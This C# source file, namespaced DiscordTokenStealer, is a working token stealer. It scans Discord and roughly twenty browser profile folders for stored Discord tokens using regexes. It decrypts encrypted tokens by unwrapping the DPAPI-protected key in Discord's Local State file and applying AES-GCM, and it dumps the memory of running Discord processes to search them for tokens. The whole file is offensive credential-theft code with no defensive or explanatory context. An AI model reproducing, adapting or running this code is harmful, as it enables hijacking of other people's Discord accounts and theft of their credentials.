using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.Text.RegularExpressions;
using System.Collections.Generic;
using Newtonsoft.Json;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;

namespace DiscordTokenStealer
{
    class Program
    {
        public enum MINIDUMP_TYPE
        {
            MiniDumpWithFullMemory = 0x00000002,
        }

        [DllImport("dbghelp.dll", SetLastError = true)]
        static extern bool MiniDumpWriteDump(
            IntPtr hProcess,
            UInt32 ProcessId,
            SafeHandle hFile,
            MINIDUMP_TYPE DumpType,
            IntPtr ExceptionParam,
            IntPtr UserStreamParam,
            IntPtr CallbackParam);

        public class Discord
        {
            static void LdbGrab(string path)
            {
                if (!Directory.Exists(path))
                {
                    Console.WriteLine($"{path} Doesn't exist");
                    return;
                }

                string[] dbFiles = Directory.GetFiles(path, "*.ldb", SearchOption.AllDirectories);
                Regex BasicRegex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", RegexOptions.Compiled);
                Regex NewRegex = new Regex(@"mfa\.[\w-]{84}", RegexOptions.Compiled);
                Regex EncryptedRegex = new Regex("(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)", RegexOptions.Compiled);
                
                foreach (var file in dbFiles)
                {
                    try
                    {
                        string contents = File.ReadAllText(file);
                        Match match1 = BasicRegex.Match(contents);
                        if (match1.Success)
                        {
                            Console.WriteLine(match1.Value);
                        }

                        Match match2 = NewRegex.Match(contents);
                        if (match2.Success)
                        {
                            Console.WriteLine(match2.Value);
                        }

                        Match match3 = EncryptedRegex.Match(contents);
                        if (match3.Success)
                        {
                            string token = DecryptToken(Convert.FromBase64String(match3.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]));
                            Console.WriteLine(token);
                        }
                    }
                    catch (IOException ex)
                    {
                        Console.WriteLine($"Error reading file {file}: {ex.Message}");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Error {file}: {ex.Message}");
                    }
                }
            }

            static bool ExtractToken(string fn)
            {
                FileInfo info = new FileInfo(fn);
                Regex BasicRegex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", RegexOptions.Compiled);
                Regex NewRegex = new Regex(@"mfa\.[\w-]{84}", RegexOptions.Compiled);
                Regex EncryptedRegex = new Regex("(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)", RegexOptions.Compiled);

                if (info.Exists)
                {
                    string contents = File.ReadAllText(info.FullName);
                    Match match1 = BasicRegex.Match(contents);
                    if (match1.Success)
                    {
                        Console.WriteLine(match1.Value);
                        return true;
                    }

                    Match match2 = NewRegex.Match(contents);
                    if (match2.Success)
                    {
                        Console.WriteLine(match2.Value);
                        return true;
                    }

                    Match match3 = EncryptedRegex.Match(contents);
                    if (match3.Success)
                    {
                        string token = DecryptToken(Convert.FromBase64String(match3.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]));
                        Console.WriteLine(token);
                        return true;
                    }

                    else
                        return false;
                }
                else
                    Console.WriteLine("Dump file not found");
                return false;
            }

            static void Main()
            {
                string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

                Dictionary<string, string> paths = new Dictionary<string, string>
                {
                    { "Discord", Path.Combine(roaming, "discord") },
                    { "Discord Canary", Path.Combine(roaming, "discordcanary") },
                    { "Discord PTB", Path.Combine(roaming, "discordptb") },
                    { "Lightcord", Path.Combine(roaming, "Lightcord") },

                    { "Chrome", Path.Combine(local, "Google", "Chrome", "User Data", "Default") },
                    { "Chrome SxS", Path.Combine(local, "Google", "Chrome SxS", "User Data") },

                    { "Opera", Path.Combine(roaming, "Opera Software", "Opera Stable") },
                    { "Opera GX", Path.Combine(roaming, "Opera Software", "Opera GX Stable") },

                    { "Amigo", Path.Combine(local, "Amigo", "User Data") },
                    { "Torch", Path.Combine(local, "Torch", "User Data") },
                    { "Kometa", Path.Combine(local, "Kometa", "User Data") },
                    { "Orbitum", Path.Combine(local, "Orbitum", "User Data") },
                    { "CentBrowser", Path.Combine(local, "CentBrowser", "User Data") },
                    { "7Star", Path.Combine(local, "7Star", "7Star", "User Data") },
                    { "Sputnik", Path.Combine(local, "Sputnik", "Sputnik", "User Data") },
                    { "Vivaldi", Path.Combine(local, "Vivaldi", "User Data", "Default") },

                    { "Epic Privacy Browser", Path.Combine(local, "Epic Privacy Browser", "User Data") },
                    { "Microsoft Edge", Path.Combine(local, "Microsoft", "Edge", "User Data", "Default") },
                    { "Uran", Path.Combine(local, "uCozMedia", "Uran", "User Data", "Default") },
                    { "Brave", Path.Combine(local, "BraveSoftware", "Brave-Browser", "User Data", "Default") },
                    { "Iridium", Path.Combine(local, "Iridium", "User Data", "Default") }
                };

                foreach (var path in paths)
                {
                    LdbGrab(path.Value);
                }

                string discord_dump_path = "memory.dmp";
                foreach (Process proid in Process.GetProcessesByName("discord"))
                {
                    UInt32 ProcessId = (uint)proid.Id;
                    IntPtr hProcess = proid.Handle;
                    MINIDUMP_TYPE DumpType = MINIDUMP_TYPE.MiniDumpWithFullMemory;
                    string out_dump_path = Path.Combine(Environment.CurrentDirectory, "memory.dmp");
                    FileStream procdumpFileStream = File.Create(out_dump_path);
                    MiniDumpWriteDump(hProcess, ProcessId, procdumpFileStream.SafeFileHandle, DumpType, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
                    procdumpFileStream.Close();

                    if (ExtractToken(discord_dump_path))
                       File.Delete(discord_dump_path);
                       break;
                }

                Console.ReadLine();
            }

            private static byte[] DecyrptKey(string path)
            {
                dynamic DeserializedFile = JsonConvert.DeserializeObject(File.ReadAllText(path));
                return ProtectedData.Unprotect(Convert.FromBase64String((string)DeserializedFile.os_crypt.encrypted_key).Skip(5).ToArray(), null, DataProtectionScope.CurrentUser);
            }

            private static string DecryptToken(byte[] buffer)
            {
                byte[] EncryptedData = buffer.Skip(15).ToArray();
                AeadParameters Params = new AeadParameters(new KeyParameter(DecyrptKey(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local State")), 128, buffer.Skip(3).Take(12).ToArray(), null);
                GcmBlockCipher BlockCipher = new GcmBlockCipher(new AesEngine());
                BlockCipher.Init(false, Params);
                byte[] DecryptedBytes = new byte[BlockCipher.GetOutputSize(EncryptedData.Length)];
                BlockCipher.DoFinal(DecryptedBytes, BlockCipher.ProcessBytes(EncryptedData, 0, EncryptedData.Length, DecryptedBytes, 0));
                return Encoding.UTF8.GetString(DecryptedBytes).TrimEnd("\r\n\0".ToCharArray());
            }
        }
    }
}